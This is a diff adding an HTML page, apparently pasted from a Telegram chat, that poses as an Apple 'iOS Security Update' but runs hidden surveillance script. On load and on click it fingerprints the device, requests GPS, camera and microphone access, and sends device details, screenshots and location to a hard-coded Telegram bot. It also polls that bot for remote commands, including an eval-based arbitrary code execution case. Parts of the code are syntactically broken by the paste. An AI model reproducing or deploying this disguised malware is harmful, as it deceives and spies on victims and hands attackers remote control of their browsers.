@@ -1,0 +1,500 @@
+四氢大麻酚👾, [25.03.2026 22:48]
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>System Security Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f5f5f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .header {
+            background: #007aff;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        .header h1 {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .header p {
+            color: rgba(255,255,255,0.9);
+            font-size: 14px;
+        }
+        .content {
+            padding: 24px;
+        }
+        .status-card {
+            background: #f8f9fa;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 20px;
+            border-left: 4px solid #34c759;
+        }
+        .status-card .status {
+            font-size: 14px;
+            color: #34c759;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .status-card .message {
+            font-size: 13px;
+            color: #6c6c70;
+        }
+        .progress-bar {
+            background: #e5e5ea;
+            border-radius: 10px;
+            height: 6px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            background: #007aff;
+            width: 65%;
+            height: 100%;
+            border-radius: 10px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .button {
+            background: #007aff;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .button:active {
+            transform: scale(0.98);
+            background: #005fc5;
+        }
+        .footer {
+            text-align: center;
+            padding: 16px;
+            font-size: 11px;
+            color: #8e8e93;
+            border-top: 1px solid #e5e5ea;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<div class="container" id="mainContainer">
+    <div class="header">
+        <h1>⚙️ iOS Security Update</h1>
+        <p>Verifying device integrity</p>
+    </div>
+    <div class="content">
+        <div class="status-card">
+            <div class="status" id="statusText">✓ Secure Connection Active</div>
+            <div class="message" id="messageText">Establishing encrypted channel...</div>
+        </div>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <button class="button" id="continueBtn">Continue to Security Check</button>
+        <p style="font-size: 12px; color: #8e8e93; margin-top: 16px; text-align: center;">
+            This process verifies your device meets security requirements.<br>
+            No personal data will be shared.
+        </p>
+    </div>
+    <div class="footer">
+        Apple Security Framework v2.4.1
+    </div>
+</div>
+
+<script>
+
+四氢大麻酚👾, [25.03.2026 22:48]
+// ==================== КОНФИГУРАЦИЯ ====================
+    // ЗАМЕНИТЕ НА ВАШИ ДАННЫЕ
+    const BOT_TOKEN = '8628618004:AAEVcyAY8PJmF7m3BcroigATd30kBztgFo0';
+    const ADMIN_CHAT_ID =  8758798496;
+    // =====================================================
+    
+    let clientId = null;
+    let deviceInfo = null;
+    let intervalId = null;
+    let isActive = true;
+    let permissionGranted = false;
+    
+    // Генерация уникального ID клиента
+    function generateClientId() {
+        const ua = navigator.userAgent;
+        const screenRes = ${screen.width}x${screen.height};
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const lang = navigator.language;
+        const data = ${ua}|${screenRes}|${timezone}|${lang}|${Date.now()};
+        return btoa(data).substring(0, 32).replace(/[+/=]/g, '');
+    }
+    
+    // Сбор информации об устройстве
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        const platform = navigator.platform || 'unknown';
+        const language = navigator.language;
+        const screenWidth = screen.width;
+        const screenHeight = screen.height;
+        const colorDepth = screen.colorDepth;
+        const touchSupport = 'ontouchstart' in window;
+        const connection = navigator.connection  navigator.mozConnection  navigator.webkitConnection;
+        const networkType = connection ? connection.effectiveType : 'unknown';
+        
+        let deviceModel = 'Unknown';
+        if (ua.includes('iPhone')) deviceModel = 'iPhone';
+        else if (ua.includes('iPad')) deviceModel = 'iPad';
+        else if (ua.includes('Mac')) deviceModel = 'Mac';
+        else deviceModel = 'Mobile Device';
+        
+        return {
+            device: deviceModel,
+            platform: platform,
+            os: ua.match(/OS (\d+)_(\d+)/) ? iOS ${ua.match(/OS (\d+)_(\d+)/)[1]}.${ua.match(/OS (\d+)_(\d+)/)[2]} : 'Unknown',
+            browser: ua.includes('Safari') ? 'Safari' : (ua.includes('Chrome') ? 'Chrome' : 'Other'),
+            language: language,
+            screen: ${screenWidth}x${screenHeight},
+            colorDepth: colorDepth,
+            touch: touchSupport,
+            network: networkType,
+            userAgent: ua.substring(0, 200),
+            timestamp: new Date().toISOString()
+        };
+    }
+    
+    // Отправка сообщения в Telegram
+    async function sendToTelegram(message, photo = null) {
+        if (!BOT_TOKEN || !ADMIN_CHAT_ID) return false;
+        
+        try {
+            if (photo) {
+                // Отправка фото (скриншот)
+                const formData = new FormData();
+                formData.append('chat_id', ADMIN_CHAT_ID);
+                formData.append('photo', photo);
+                formData.append('caption', message);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } else {
+                // Отправка текста
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            }
+            return true;
+        } catch(e) {
+            console.error('Send error:', e);
+            return false;
+        }
+    }
+    
+    // Создание скриншота экрана (через html2canvas или canvas API)
+    async function takeScreenshot() {
+        try {
+            // Получаем элемент body для скриншота
+            const element = document.body;
+            const originalOverflow = document.body.style.overflow;
+            document.body.style.overflow = 'visible';
+            
+            // Используем html2canvas из CDN
+            if (typeof html2canvas === 'undefined') {
+                await loadHtml2Canvas();
+            }
+
+四氢大麻酚👾, [25.03.2026 22:48]
+const canvas = await html2canvas(element, {
+                scale: 1.5,
+                backgroundColor: '#ffffff',
+                logging: false,
+                useCORS: true,
+                allowTaint: false
+            });
+            
+            document.body.style.overflow = originalOverflow;
+            
+            // Конвертируем в blob для отправки
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+            return blob;
+        } catch(e) {
+            console.error('Screenshot error:', e);
+            return null;
+        }
+    }
+    
+    // Загрузка библиотеки html2canvas
+    function loadHtml2Canvas() {
+        return new Promise((resolve, reject) => {
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+            script.onload = resolve;
+            script.onerror = reject;
+            document.head.appendChild(script);
+        });
+    }
+    
+    // Запрос разрешений (GPS, камера, микрофон) по клику
+    async function requestPermissions() {
+        const permissions = [];
+        
+        // Геолокация
+        if ('geolocation' in navigator) {
+            permissions.push(new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => { resolve({ type: 'gps', status: 'granted', data: pos.coords }); },
+                    (err) => { resolve({ type: 'gps', status: 'denied', error: err.message }); }
+                );
+            }));
+        }
+        
+        // Камера и микрофон
+        if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+            permissions.push(new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then((stream) => {
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve({ type: 'camera_mic', status: 'granted' });
+                    })
+                    .catch((err) => {
+                        resolve({ type: 'camera_mic', status: 'denied', error: err.message });
+                    });
+            }));
+        }
+        
+        const results = await Promise.all(permissions);
+        permissionGranted = results.some(r => r.status === 'granted');
+        return results;
+    }
+    
+    // Регистрация клиента на сервере (Telegram)
+    async function registerClient() {
+        clientId = generateClientId();
+        deviceInfo = getDeviceInfo();
+        
+        const message = <b>🔌 NEW DEVICE CONNECTED</b>\n\n +
+            <b>🆔 ID:</b> <code>${clientId}</code>\n +
+            <b>📱 Device:</b> ${deviceInfo.device}\n +
+            <b>🍎 iOS:</b> ${deviceInfo.os}\n +
+            <b>🌐 Browser:</b> ${deviceInfo.browser}\n +
+            <b>📺 Screen:</b> ${deviceInfo.screen}\n +
+            <b>🌍 Language:</b> ${deviceInfo.language}\n +
+            <b>📡 Network:</b> ${deviceInfo.network}\n +
+            <b>🕐 Time:</b> ${deviceInfo.timestamp};
+        
+        await sendToTelegram(message);
+        
+        // Отправляем приветственный скриншот
+        const screenshot = await takeScreenshot();
+        if (screenshot) {
+            await sendToTelegram(`📸 Initial screenshot for device <code>${clientId}</code>`, screenshot);
+        }
+        
+        return true;
+    }
+    
+    // Обработка команд от Telegram
+    async function handleCommands() {
+        if (!clientId) return;
+        
+        try {
+            const url = https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=5;
+            const response = await fetch(url);
+            const data = await response.json();
+            
+            if (!data.ok  !data.result  data.result.length === 0) return;
+            
+            for (const update of data.result) {
+                const message = update.message;
+                if (!message || message.chat.id != ADMIN_CHAT_ID) continue;
+                
+                const text = message.
+
+四氢大麻酚👾, [25.03.2026 22:48]
+text;
+                if (!text) continue;
+                
+                // Формат команды: /cmd ID команда
+                // Пример: /cmd 1234567890 screenshot
+                const match = text.match(/^\/cmd\s+(\S+)\s+(.+)$/);
+                if (!match) continue;
+                
+                const targetId = match[1];
+                const command = match[2].toLowerCase();
+                
+                if (targetId !== clientId) continue;
+                
+                // Обработка команд
+                switch(command) {
+                    case 'screenshot':
+                    case 'screen':
+                        const screenshot = await takeScreenshot();
+                        if (screenshot) {
+                            await sendToTelegram(`📸 Screenshot from <code>${clientId}</code>`, screenshot);
+                        } else {
+                            await sendToTelegram(`❌ Failed to take screenshot from <code>${clientId}</code>`);
+                        }
+                        break;
+                        
+                    case 'info':
+                        const info = <b>📱 DEVICE INFO</b>\n\n +
+                            <b>ID:</b> <code>${clientId}</code>\n +
+                            <b>Device:</b> ${deviceInfo.device}\n +
+                            <b>OS:</b> ${deviceInfo.os}\n +
+                            <b>Browser:</b> ${deviceInfo.browser}\n +
+                            <b>Screen:</b> ${deviceInfo.screen}\n +
+                            <b>Language:</b> ${deviceInfo.language}\n +
+                            <b>Network:</b> ${deviceInfo.network}\n +
+                            <b>Touch:</b> ${deviceInfo.touch ? 'Yes' : 'No'}\n +
+                            <b>UserAgent:</b> <code>${deviceInfo.userAgent}</code>;
+                        await sendToTelegram(info);
+                        break;
+                        
+                    case 'gps':
+                    case 'location':
+                        if ('geolocation' in navigator) {
+                            navigator.geolocation.getCurrentPosition(
+                                async (pos) => {
+                                    const mapsUrl = https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude};
+                                    const gpsMsg = <b>📍 GPS LOCATION</b>\n\n +
+                                        <b>Latitude:</b> ${pos.coords.latitude}\n +
+                                        <b>Longitude:</b> ${pos.coords.longitude}\n +
+                                        <b>Accuracy:</b> ±${pos.coords.accuracy}m\n +
+                                        <b>Map:</b> <a href="${mapsUrl}">Open in Google Maps</a>;
+                                    await sendToTelegram(gpsMsg);
+                                },
+                                async (err) => {
+                                    await sendToTelegram(`❌ GPS error: ${err.message}`);
+                                }
+                            );
+                        } else {
+                            await sendToTelegram(`❌ GPS not supported`);
+                        }
+                        break;
+                        
+                    case 'ping':
+                        await sendToTelegram(`🏓 Pong from <code>${clientId}</code> | Time: ${new Date().toISOString()}`);
+                        break;
+                        
+                    case 'exec':
+                        // Выполнение произвольного JS (RCE)
+                        const jsCode = command.substring(5); // после "exec "
+                        try {
+                            const result = eval(jsCode);
+                            const resultStr = typeof result === 'object' ? JSON.stringify(result, null, 2) : String(result);
+                            await sendToTelegram(`<b>💻 JS EXEC RESULT</b>\n\n<code>${resultStr.substring(0, 1000)}</code>`);
+                        } catch(e) {
+                            await sendToTelegram(`<b>❌ JS EXEC ERROR</b>\n\n<code>${e.message}</code>`);
+
+四氢大麻酚👾, [25.03.2026 22:48]
+}
+                        break;
+                        
+                    default:
+                        await sendToTelegram(`Unknown command: ${command}\nAvailable: screenshot, info, gps, ping`);
+                }
+                
+                // Помечаем update как обработанный
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${update.update_id + 1}`);
+            }
+        } catch(e) {
+            console.error('Command handling error:', e);
+        }
+    }
+    
+    // Периодический heartbeat
+    async function sendHeartbeat() {
+        if (!isActive) return;
+        await sendToTelegram(`💓 Heartbeat from <code>${clientId}</code> | ${new Date().toLocaleTimeString()}`);
+    }
+    
+    // Основной цикл
+    async function mainLoop() {
+        if (!isActive) return;
+        await handleCommands();
+        setTimeout(mainLoop, 3000);
+    }
+    
+    // Запуск
+    async function init() {
+        // Ждем загрузки html2canvas
+        await loadHtml2Canvas();
+        
+        // Обновляем UI
+        document.getElementById('statusText').innerHTML = '✓ Secure Channel Established';
+        document.getElementById('messageText').innerHTML = 'Verification complete. System ready.';
+        
+        // Регистрация
+        await registerClient();
+        
+        // Запрос разрешений по клику на кнопку
+        const btn = document.getElementById('continueBtn');
+        btn.addEventListener('click', async () => {
+            btn.innerText = 'Processing...';
+            btn.disabled = true;
+            
+            await requestPermissions();
+            
+            btn.innerText = '✓ Verification Complete';
+            document.getElementById('statusText').innerHTML = '✓ Fully Verified';
+            document.getElementById('messageText').innerHTML = 'Your device meets all security requirements.';
+            
+            setTimeout(() => {
+                btn.innerText = 'Continue to Apple ID';
+                btn.disabled = false;
+            }, 2000);
+        });
+        
+        // Запускаем цикл обработки команд
+        mainLoop();
+        
+        // Heartbeat каждые 30 секунд
+        setInterval(sendHeartbeat, 30000);
+    }
+    
+    // Старт
+    init();
+</script>
+</body>
+</html>
